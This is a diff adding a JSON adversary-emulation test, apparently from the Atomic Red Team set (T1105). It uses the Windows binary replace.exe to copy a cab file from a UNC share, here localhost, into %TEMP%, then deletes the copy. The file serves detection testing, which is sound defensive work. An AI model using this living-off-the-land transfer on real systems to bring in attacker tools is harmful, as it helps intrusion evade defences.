@@ -1,0 +1,58 @@
+{
+  "id": "ed0335ac-0354-400c-8148-f6151d20035a",
+  "name": "Lolbas replace.exe use to copy UNC file",
+  "description": "Copy UNC file to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "09a0ac40-ef2e-4c91-a7e1-eb5514091f8e",
+      "type": "execute-command",
+      "data": {
+        "command": "del %TEMP%\\redcanary.cab \u003enul 2\u003e\u00261\n#{Path_replace} #{replace_cab} %TEMP% /A\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "38fdfc58-2f85-461b-8ec5-1dd87d11e0d1",
+      "type": "execute-command",
+      "data": {
+        "command": "del %TEMP%\\redcanary.cab \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "09a0ac40-ef2e-4c91-a7e1-eb5514091f8e",
+      "p": "on-success",
+      "o": "38fdfc58-2f85-461b-8ec5-1dd87d11e0d1"
+    },
+    {
+      "s": "09a0ac40-ef2e-4c91-a7e1-eb5514091f8e",
+      "p": "on-failure",
+      "o": "38fdfc58-2f85-461b-8ec5-1dd87d11e0d1"
+    }
+  ],
+  "tags": [
+    "T1105",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "replace_cab",
+      "type": "path",
+      "description": "UNC Path to the cab file",
+      "value": "\\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\redcanary.cab"
+    },
+    {
+      "name": "Path_replace",
+      "type": "path",
+      "description": "Path to replace.exe",
+      "value": "C:\\Windows\\System32\\replace.exe"
+    }
+  ]
+}
